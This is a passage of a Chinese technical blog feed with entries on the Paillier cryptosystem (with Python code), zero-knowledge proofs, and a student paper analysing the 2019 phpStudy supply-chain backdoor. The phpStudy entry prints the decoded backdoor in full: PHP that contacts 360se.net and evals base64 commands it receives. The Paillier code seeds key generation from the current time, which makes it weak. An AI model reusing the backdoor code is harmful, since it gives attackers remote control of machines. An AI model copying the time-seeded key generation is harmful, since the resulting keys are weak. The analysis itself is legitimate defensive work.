href="https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf" target="_blank" rel="noopener">https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/76124722" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/76124722</a><br><a href="https://github.com/twhiteman/pyDes/blob/master/pyDes.py" target="_blank" rel="noopener">https://github.com/twhiteman/pyDes/blob/master/pyDes.py</a><br><a href="https://en.wikipedia.org/wiki/Triple_DES" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Triple_DES</a><br><a href="http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/" target="_blank" rel="noopener">http://blog.niuhemoon.xyz/pages/2018/05/18/Python-Symmetric-encryption/</a><br><a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" rel="noopener">https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf</a><br><a href="https://www.cxyxiaowu.com/3239.html" target="_blank" rel="noopener">https://www.cxyxiaowu.com/3239.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python实现Paillier加密解密算法</title>
    <link href="/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h2><p>首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。</p><p>然后根据卡迈克尔函数计算私钥 $\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。</p><h2 id="Encipher"><a href="#Encipher" class="headerlink" title="Encipher"></a>Encipher</h2><p>加密时取一个随机数 $r$，计算出 $c \equiv g^m r^n(mod\ n^2)$。</p><h2 id="Decipher"><a href="#Decipher" class="headerlink" title="Decipher"></a>Decipher</h2><p>解密有一点复杂。首先我们可以得到：</p><p>$$<br>c^\lambda \equiv (g^m r^n)^\lambda \equiv g^{m \lambda} r^{n \lambda}(mod\ n^2)<br>$$</p><p>根据卡迈克尔函数，即对于任何 $\omega \in Z^*_{n^2}$，必定存在以下结论：</p><p>$$<br>\omega^{n \lambda} \equiv 1(mod\ n^2)<br>$$</p><p>那么可以得到 $c^\lambda \equiv g^{m \lambda}(mod\ n^2)$。</p><p>然后看看生成元 $g$，实际上是通过 $g=(1+\alpha n)\beta^n$ 得到的，并且 $\alpha,\beta \in Z^*_n$。由此可得：</p><p>$$<br>c^\lambda \equiv (1+\alpha n)^{m \lambda}\beta^{n m \lambda} \equiv (1+\alpha n)^{m \lambda}(mod\ n^2)<br>$$</p><p>再根据公式 $(1+n)^x \equiv 1+xn(mod\ n^2)$，可以得到：</p><p>$$<br>c^\lambda \equiv (1+n)^{\alpha m \lambda} \equiv 1+n \alpha m \lambda(mod\ n^2)<br>$$</p><p>然后我们在此处定义一个函数 $L(x)=\frac{x-1}{n}$，则 $L(c^\lambda)=\alpha m \lambda$。</p><p>那么我们可以得到明文的计算公式为 $m \equiv \frac{L(c^\lambda)}{L(g^\lambda)} \equiv \frac{\alpha m \lambda}{\alpha \lambda} \equiv m(mod\ n)$。</p><h1 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h1><p>通过 gmpy2 和 libnum 库实现。</p><pre><code class="python">#!/usr/bin/env pythonimport gmpy2import randomimport timeimport libnumdef get_prime(rs):    p = gmpy2.mpz_urandomb(rs, 1024)    while not gmpy2.is_prime(p):        p = p + 1    return pdef L(x, n):    return (x - 1) / ndef keygen():    rs = gmpy2.random_state(int(time.time()))    p = get_prime(rs)    q = get_prime(rs)    n = p * q    lmd = (p - 1) * (q - 1)    #g = random.randint(1, n ** 2)    g = n + 1    if gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** 2), n), n) != 1:        print &#39;[!] g is not good enough&#39;        exit()    pk = [n, g]    sk = lmd    return pk, skdef encipher(plaintext, pk):    m = libnum.s2n(plaintext)    n, g = pk    r = random.randint(1, n ** 2)    c = gmpy2.powmod(g, m, n ** 2) * gmpy2.powmod(r, n, n ** 2) % (n ** 2)    return cdef decipher(c, pk, sk):    [n, g] = pk    lmd = sk    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n    m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n    plaintext = libnum.n2s(m)    return plaintextif __name__ == &#39;__main__&#39;:    pk, sk = keygen()    #print &#39;pk:&#39;, pk    #print &#39;sk:&#39;, sk    plaintext = raw_input(&#39;Please input your message: &#39;)    ciphertext = encipher(plaintext, pk)    print &#39;Ciphertext:&#39;, ciphertext    plaintext = decipher(ciphertext, pk, sk)    print &#39;Plaintext:&#39;, plaintext</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://security.hsr.ch/msevote/docs/Paillier_Cryptosystem.pdf" target="_blank" rel="noopener">The Paillier Cryptosystem</a><br><a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E9%82%81%E5%85%8B%E7%88%BE%E5%87%BD%E6%95%B8" target="_blank" rel="noopener">卡迈克尔函数</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Analysis of phpStudy Backdoor</title>
    <link href="/2019/10/14/Analysis-of-phpStudy-Backdoor/"/>
    <url>/2019/10/14/Analysis-of-phpStudy-Backdoor/</url>
    
    <content type="html"><![CDATA[<p>正巧通识课需要交一篇安全相关的论文，顺便分析一下。</p><a id="more"></a><h1 id="从-phpStudy-后门事件谈软件安全"><a href="#从-phpStudy-后门事件谈软件安全" class="headerlink" title="从 phpStudy 后门事件谈软件安全"></a>从 phpStudy 后门事件谈软件安全</h1><p><strong>摘要</strong>：如今互联网发展迅速，手机电脑已经成为了每个人时刻不离手的物品。在使用各种电子产品的同时，我们必然的会接触到许许多多不同的软件。然而网络上的软件繁多复杂，我们要在这些难以判断的软件中找到真正安全的软件。本文从“phpStudy 后门”事件入手，分析了软件安全的重要性，介绍了相关的法律知识，最后提出了自己的建议和总结。</p><p><strong>关键词</strong>：phpStudy 后门；软件安全；安全意识</p><h2 id="第-1-章-软件安全背景介绍"><a href="#第-1-章-软件安全背景介绍" class="headerlink" title="第 1 章 软件安全背景介绍"></a>第 1 章 软件安全背景介绍</h2><p>软件安全就是使软件在受到恶意攻击的情形下依然能够继续正确运行及确保软件被在授权范围内合法使用的思想。软件安全目前越来越受到重视,日常看到介绍软件安全的文章也越来越多。系统安全、应用安全、敏感信息的保护等话题已经成为软件企业不能回避的挑战，如何在开发过程中制度化、流程化的实现安全特性，是所有软件企业都需着重考虑的问题。软件安全中的智力成果、知识产权不被非法使用，包括篡改及盗用等。研究的内容主要包括防止软件盗版、软件逆向工程、授权加密以及非法篡改等。采用的技术包括软件水印（静态水印及动态水印）、代码混淆（源代码级别的混淆，目标代码级别的混淆等）、防篡改技术、授权加密技术以及虚拟机保护技术等。[1]</p><p>软件已经成为我们的关键基础设施和日常生活的重要组成部分，已融入到我们的各种产品中，这些年来软件得到了高速的发展。随着互联网和移动互联网的普及，人们使用软件的方式也发生了很大变化。很多年前，我们可能大部分使用的是一个本地的软件或者一个局域网内软件。因为是在一个有限的范围内使用，那它遭受攻击和破坏的概率就比较小。而现在呢，我们主要是通过 Web 界面或 app 来使用，只要有网络的地方，都可以使用到软件，这增加了潜在的风险，也为黑客或者不怀好意者带来更多的攻击和破坏机会。同时，目前各个国家对软件安全和隐私越来越重视。典型的如欧盟的 GDPR 协议的生效，如果说违反了欧盟的 GDP 协议，处罚是相当的严重，甚至可能导致一个企业遭受重创。还有现在以美国为首的西方国家以安全理由，来封杀中国的通讯设备制造商，未来也可能会有更多的国内高科技企业受影响。对于这个，一方面我们要据理力争；另一方面，打铁还靠自身硬，我们必须有充分的证据来证明我们的软件是安全的。[4]</p><p>在这种内外部环境的严峻的压力下，软件安全已经成为一个企业能否长足的发展生存下去的一个核心因素，而不再是可有可无的。这样更多的企业和个人越来越重视软件安全也是必然的结果。[4]</p><h2 id="第-2-章-“phpStudy-后门”事件概述"><a href="#第-2-章-“phpStudy-后门”事件概述" class="headerlink" title="第 2 章 “phpStudy 后门”事件概述"></a>第 2 章 “phpStudy 后门”事件概述</h2><p>2019 年 9 月 20 日，一则杭州警方通报打击涉网违法犯罪专项行动战果的新闻中，通报了警方发现 phpStudy 软件被植入后门这一事件。phpStudy 作为一款很多 Web 学习者必备的软件，这一后门事件的发生引起了巨大的影响。</p><p>phpStudy 软件是一款免费的 PHP 调试环境的程序集成包，集成了最新的 Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer 多款软件一次性安装，无需配置即可直接使用，具有 PHP 环境调试和开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万 PHP 语言学习者、开发者用户。[2]</p><p>然而，如此绿色无公害的开发软件遭到了黑客的毒手。据杭州公安披露，黑客组织早在 2016 年就编写了“后门”文件，并非法侵入了 phpStudy 的官网，篡改了软件安装包植入“后门”。该“后门”无法被杀毒软件扫描删除，并且藏匿于软件某功能性代码中，极难被发现。技术上来讲，该后门是篡改了 phpStudy 的扩展库，植入的后门主要是可以直接执行远程代码，危害极大。而该“后门”具有控制计算机的功能，可以远程控制下载运行脚本实现用户个人信息收集。从 2016 年起，黑客利用该“后门”犯罪作恶一发不可收拾，大量中招的电脑沦为“肉鸡”执行危险命令，不计其数的用户账号密码、电脑数据、敏感信息被远程抓取和回传。据统计，黑客已控制了超过 67 万台电脑，非法获取账号密码类、聊天数据类、设备码类等数据 10 万余组，而此案也是 2019 年以来，国内影响最为严重的供应链攻击事件。[7]</p><h2 id="第-3-章-“phpStudy-后门”事件产生的影响"><a href="#第-3-章-“phpStudy-后门”事件产生的影响" class="headerlink" title="第 3 章 “phpStudy 后门”事件产生的影响"></a>第 3 章 “phpStudy 后门”事件产生的影响</h2><h3 id="3-1-“phpStudy-后门”事件影响的范围"><a href="#3-1-“phpStudy-后门”事件影响的范围" class="headerlink" title="3.1 “phpStudy 后门”事件影响的范围"></a>3.1 “phpStudy 后门”事件影响的范围</h3><p>在该事件发生之后，全球总量共计有 90080 个目标现在可能会受到 phpStudy 后门的影响。</p><p>现在大部分正在被使用的 phpStudy 版本都存在有后门（主要影响版本为 phpStudy2016、phpStudy2018）。如果后门存在，可能导致服务器或主机被上传 shell，通俗来说，也就是所有存在后门的所有系统都有可能被黑客拿到最高权限，并且所有的信息都有可能已经被泄漏了。下面根据数据分析一下该事件的影响范围之大。</p><p>以下分析数据为通过知道创宇 ZoomEye 搜索结果。</p><p><img src="/pics/Analysis-of-phpStudy-Backdoor/1.png" srcset="/img/loading.gif" alt></p><p>以上为存在 phpStudy 服务的全球主机。毕竟 phpStudy 是国产软件，所以受影响最多的国家还是中国，其次是美国。在对美国受影响的目标进行简单的探查之后，发现基本都是属于 IDC 机房的机器，基本上可以判断都是国人在购买的 VPS 上搭建的 phpStudy。</p><p>其中，VPS（Virtual Private Server，虚拟专用服务器）技术，是指将一台服务器分割成多个虚拟专享服务器的优质服务。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS 为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于 IDC 资源租用。[9] 由此可知，其实有很多用户会在 VPS 上搭建一些服务或者是存储一些重要的数据，然而如果 VPS 上存在 phpStudy 的后门，就会使得大量的信息泄漏。再加上本身 VPS 使用者的基数之大，显而易见地会产生巨大的影响。</p><p>接下来看看国内所受到的影响范围。</p><p><img src="/pics/Analysis-of-phpStudy-Backdoor/2.png" srcset="/img/loading.gif" alt></p><p>国内的分布图中基本可以看出主要分布在香港、北上广等计算机技术比较发达的地区，国内主要的服务器存放处都受到了严重的影响。</p><p>同时，在漏洞被曝出之后，知道创宇 404 积极防御团队检测到 2019 年 9 月 24 日开始，互联网上有人开始对 phpStudy 后门中的 RCE 进行利用。[6]</p><h3 id="3-2-“phpStudy-后门”触犯了我国的网络安全法"><a href="#3-2-“phpStudy-后门”触犯了我国的网络安全法" class="headerlink" title="3.2 “phpStudy 后门”触犯了我国的网络安全法"></a>3.2 “phpStudy 后门”触犯了我国的网络安全法</h3><p>就“phpStudy 后门”事件而言，涉及了我国的网络安全法中以下几条内容：</p><ul><li>第二十二条：网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。[3]</li><li>第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。[3]</li><li>第四十八条：任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。[3]</li><li>第六十三条：违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。[3]</li><li>那么本次事件中，软件制作者及所属公司是否涉案？专案组在事件发生后专程前往安徽合肥，对 phpStudy 软件的制作人及所属公司开展调查，并结合犯罪嫌疑人的供述申辩及客观证据，已经排除了软件作者和所属公司的犯罪嫌疑。公安机关已依法封存扣押了涉案的服务器及电子设备，并督促该软件所属公司对软件进行整改。[2]在事件发生后的没几天，phpStudy 官网也已经及时地推出了后门检测软件。</li></ul><h2 id="第-4-章-如何防范软件后门等安全问题"><a href="#第-4-章-如何防范软件后门等安全问题" class="headerlink" title="第 4 章 如何防范软件后门等安全问题"></a>第 4 章 如何防范软件后门等安全问题</h2><h3 id="4-1-后门利用方法简介"><a href="#4-1-后门利用方法简介" class="headerlink" title="4.1 后门利用方法简介"></a>4.1 后门利用方法简介</h3><p>经过调查，在本次事件中，绝大多数的后门都位于 phpStudy 目录下的“php_xmlrpc.dll”文件中。下面对存在后门的文件进行简单的分析。</p><p>通过查看字符串可以发现文件中出现了可疑的“eval”字符串。</p><p><img src="/pics/Analysis-of-phpStudy-Backdoor/3.png" srcset="/img/loading.gif" alt></p><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 eval 函数（PHP 函数)去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。[8]</p><p>跟踪反编译代码可以看到 eval 字符串对应处存在对 Shellcode 的处理，通过 PHP 函数 gzuncompress 解压 Shellcode 并运行。</p><p><img src="/pics/Analysis-of-phpStudy-Backdoor/4.png" srcset="/img/loading.gif" alt></p><p>将 Shellcode 数据取出来，编写 PHP 代码可以得到真正的代码，通过 eval 执行了一串解密后的 base64 串。</p><p><img src="/pics/Analysis-of-phpStudy-Backdoor/5.png" srcset="/img/loading.gif" alt></p><p>可以看到 Shellcode 中通过 base64_decode 函数揭秘 base64 加密的字符串，并将解密的结果使用 eval 函数执行。通过解密密文来执行恶意代码也是黑客用来编写病毒或者是后门的一种手法，可以将原本一眼就能看出的奇怪的代码完美地隐藏在密文之下，以达到偷偷执行恶意代码的目的。</p><p>下面就可以通过 base64 解密后可以得到最终的恶意代码。</p><pre><code class="php">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);error_reporting(0);$h = $_SERVER[&#39;HTTP_HOST&#39;];$p = $_SERVER[&#39;SERVER_PORT&#39;];$fp = fsockopen($h, $p, $errno, $errstr, 5);if (!$fp) {} else {    $out = &quot;GET {$_SERVER[&#39;SCRIPT_NAME&#39;]} HTTP/1.1\r\n&quot;;    $out .= &quot;Host: {$h}\r\n&quot;;    $out .= &quot;Accept-Encoding: compress,gzip\r\n&quot;;    $out .= &quot;Connection: Close\r\n\r\n&quot;;    fwrite($fp, $out);    fclose($fp);}@ini_set(&quot;display_errors&quot;,&quot;0&quot;);error_reporting(0);function tcpGet($sendMsg = &#39;&#39;, $ip = &#39;360se.net&#39;, $port = &#39;20123&#39;){    $result = &quot;&quot;;  $handle = stream_socket_client(&quot;tcp://{$ip}:{$port}&quot;, $errno, $errstr,10);  if( !$handle ){    $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);    if( !$handle ){        return &quot;err&quot;;    }  }  fwrite($handle, $sendMsg.&quot;\n&quot;);    while(!feof($handle)){        stream_set_timeout($handle, 2);        $result .= fread($handle, 1024);        $info = stream_get_meta_data($handle);        if ($info[&#39;timed_out&#39;]) {          break;        }     }  fclose($handle);  return $result;}$ds = array(&quot;www&quot;,&quot;bbs&quot;,&quot;cms&quot;,&quot;down&quot;,&quot;up&quot;,&quot;file&quot;,&quot;ftp&quot;);$ps = array(&quot;20123&quot;,&quot;40125&quot;,&quot;8080&quot;,&quot;80&quot;,&quot;53&quot;);$n = false;do {    $n = false;    foreach ($ds as $d){        $b = false;        foreach ($ps as $p){            $result = tcpGet($i,$d.&quot;.360se.net&quot;,$p);            if ($result != &quot;err&quot;){                $b =true;                break;            }        }        if ($b)break;    }    $info = explode(&quot;&lt;^&gt;&quot;,$result);    if (count($info)==4){        if (strpos($info[3],&quot;/*Onemore*/&quot;) !== false){            $info[3] = str_replace(&quot;/*Onemore*/&quot;,&quot;&quot;,$info[3]);            $n=true;        }        @eval(base64_decode($info[3]));    }}while($n);</code></pre><p>可以看到恶意代码中，存在远程服务器的 IP（360se.net）和端口（20123）。黑客可以通过该漏洞拿到服务器或是电脑的权限，做任何想干的事。</p><p>目前网络中仍然有超过 1700 个存在“后门”的“php_xmlrpc.dll”文件。这些通过修改常用软件底层源代码，秘密添加的“后门”，可以在用户无感知的状态下，非法获取用户隐私数据，严重侵害了人民群众的合法权益，甚至危害国家安全。[7]</p><h3 id="4-2-防范方法"><a href="#4-2-防范方法" class="headerlink" title="4.2 防范方法"></a>4.2 防范方法</h3><p>就本次“phpStudy 后门”事件来说，后门存在的时间已经很久了，无法判断遭受后门的网站已经泄漏了什么，很有可能已经造成了巨大的信息泄漏。同时，在被曝出漏洞之后，phpStudy 官网也已经在第一时间放出了安全自检修复程序，该程序可以对本地的 phpStudy 目录进行扫描检查。</p><p>通过这次事件，我们应该在平常下载各种软件时警惕各种有可能的安全问题，提高我们的安全意识，以防被不法分子入侵。以下列举了几个安全措施。</p><h4 id="4-2-1-使用第三方安全卫士"><a href="#4-2-1-使用第三方安全卫士" class="headerlink" title="4.2.1 使用第三方安全卫士"></a>4.2.1 使用第三方安全卫士</h4><p>安装第三方的一些安全卫士或者是安全管家，借助其他软件保护电脑的安全。并且定期对电脑进行扫描。</p><h4 id="4-2-2-人工检查"><a href="#4-2-2-人工检查" class="headerlink" title="4.2.2 人工检查"></a>4.2.2 人工检查</h4><p>安装过已经被曝出漏洞软件的服务器，务必及时修改密码，其他使用相同注册邮箱和密码的网络帐户也应该一并修改，尽最大可能消除风险。</p><p>不要随意下载，接收和运行不明来源的文件，尽量到 phpStudy 官网下载最新版 phpStudy 安装包进行更新，以防中招。对于其他任何的软件来说也是如此，尽可能在官网下载，而不是去一些没有官方说明的下载网站下载软件，避免下载到额外的病毒或者是其他恶意软件。</p><h4 id="4-2-3-安全修补"><a href="#4-2-3-安全修补" class="headerlink" title="4.2.3 安全修补"></a>4.2.3 安全修补</h4><p>在官方网站下载对应补丁或者是检测软件。电脑的操作系统也是软件安全的一部分，我们可以利用 Windows Defender 或者是防火墙来加固我们电脑的安全堡垒。</p><h2 id="第-5-章-建议和总结"><a href="#第-5-章-建议和总结" class="headerlink" title="第 5 章 建议和总结"></a>第 5 章 建议和总结</h2><p>如今，互联网已经是与每个人密不可分的一部分，软件安全也日益成为一个重要的话题。一方面我们已经有国家安全法对许多网络上违法的软件行为进行了限制，已经很大程度上维护了我们平时使用软件的安全。另一方面，作为互联网时代的每一分子，我们都需要掌握一定基础的安全知识和技能，遇到违法的行为能够运用法律来抵制，遇到合理的行为要善于学习。这样才能让我们的信息社会更加安全，网络环境更加美好。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] 百度百科词条：软件安全（<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/4072341?fr=aladdin）" target="_blank" rel="noopener">https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/4072341?fr=aladdin）</a>.<br>[2] phpstudy 官网于 2016 年被入侵，犯罪分子篡改软件并植入后门（<a href="https://www.anquanke.com/post/id/187152）" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187152）</a>.<br>[3] 中华人民共和国网络安全法.<br>[4] 重新认识软件安全（<a href="https://www.jianshu.com/p/e478b34a5c02）" target="_blank" rel="noopener">https://www.jianshu.com/p/e478b34a5c02）</a>.<br>[5] phpStudy 后门如何检测和修复（<a href="https://blog.51cto.com/14313004/2440185）" target="_blank" rel="noopener">https://blog.51cto.com/14313004/2440185）</a>.<br>[6] PhpStudy 后门分析（<a href="https://paper.seebug.org/1044/#zoomeye）" target="_blank" rel="noopener">https://paper.seebug.org/1044/#zoomeye）</a>.<br>[7] 数十万 PhpStudy 用户被植入后门，快来检测你是否已沦为“肉鸡”！（<a href="https://mp.weixin.qq.com/s/HtJIIlCnI_8VLfXm1A4GrQ）" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/HtJIIlCnI_8VLfXm1A4GrQ）</a>.<br>[8] Web 安全之代码执行漏洞（<a href="http://www.sohu.com/a/328927764_120104204）" target="_blank" rel="noopener">http://www.sohu.com/a/328927764_120104204）</a>.<br>[9] 百度百科词条：VPS（<a href="https://baike.baidu.com/item/VPS）" target="_blank" rel="noopener">https://baike.baidu.com/item/VPS）</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>何为零知识证明</title>
    <link href="/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"/>
    <url>/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p>何为<a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a>？</p><a id="more"></a><p>零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。</p><h1 id="童话里的零知识证明"><a href="#童话里的零知识证明" class="headerlink" title="童话里的零知识证明"></a>童话里的零知识证明</h1><p>举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。</p><p>阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」</p><p>这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。</p><h1 id="零知识证明的优点"><a href="#零知识证明的优点" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ul><li>在使用零知识证明的时候，不降低安全性。</li><li>零知识证明工作高效，计算过程量小，双方交换信息少。</li><li>既安全、又有良好的隐私、又减少计算量。</li></ul><h1 id="零知识证明的性质"><a href="#零知识证明的性质" class="headerlink" title="零知识证明的性质"></a>零知识证明的性质</h1><p>根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质：</p><ol><li>完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。</li><li>合理性（soundness）：没有人能够假冒证明方，使这个证明成功。</li><li>零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。</li></ol><h1 id="零知识证明的优点-1"><a href="#零知识证明的优点-1" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ol><li>随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。</li><li>高效性。该过程计算量小，双方交换的信息量少。</li><li>安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。</li><li>许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。</li></ol><h1 id="证明举例"><a href="#证明举例" class="headerlink" title="证明举例"></a>证明举例</h1><p>例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法：</p><ol><li>A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。</li><li>B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 B，从而证明自己确实拥有该房间的钥匙。</li></ol><p>后面的方法 2 属于零知识证明。好处在于在整个证明的过程中，B 始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p>例 2：A 拥有 B 的公钥，A 没有见过 B，而 B 见过 A 的照片，某天二人偶然碰面，B 认出了 A，但 A 不能确定面前的人是否是 B，这时 B 要向 A 证明自己是 B，也有两个方法：</p><ol><li>B 把自己的私钥给 A，A 用这个私钥对某个数据加密，然后用 B 的公钥解密，如果正确，则证明对方确实是 B。</li><li>A 给出一个随机值，B 用自己的私钥对其加密，然后把加密后的数据交给 A，A 用 B 的公钥解密，如果能够得到原来的随机值，则证明对方是 B。</li></ol><p>后面的方法属于零知识证明。</p><p>有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A 要向 B 证明自己拥有该门的钥匙。采用零知识证明，则 B 看着 A 从入口进入走廊，然后又从出口走出走廊，这时 B 没有得到任何关于这个钥匙的信息，但是完全可以证明 A 拥有钥匙。</p><h1 id="零知识证明一般的过程"><a href="#零知识证明一般的过程" class="headerlink" title="零知识证明一般的过程"></a>零知识证明一般的过程</h1><p>假设有两方人，甲方是证明者，乙方是验证者。他们在一个工作环境内有相同的一组函数和一组数值。证明开始：</p><ol><li>甲方先发送满足条件的随机值给乙方，这个称为承诺。</li><li>乙方发送满足条件的随机值给甲方，这个称为挑战。</li><li>甲方执行一个不让乙方知道的计算，并把计算结果给乙方，这个称为响应。</li><li>乙方对响应进行验证，验证失败就退出，验证成功回到 1，然后继续顺序执行 n 次。</li></ol><p>如果每一次乙方验证都是成功的，那么乙方就相信了和甲方之间的共识。在整个过程中没有透露任何相关秘密信息。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/3f524c925c34" target="_blank" rel="noopener">https://www.jianshu.com/p/3f524c925c34</a><br><a href="https://blog.csdn.net/liudongdong19/article/details/82884742" target="_blank" rel="noopener">https://blog.csdn.net/liudongdong19/article/details/82884742</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能合约入门</title>
    <link href="/2019/09/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/"/>
    <url>/2019/09/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/</url>
    
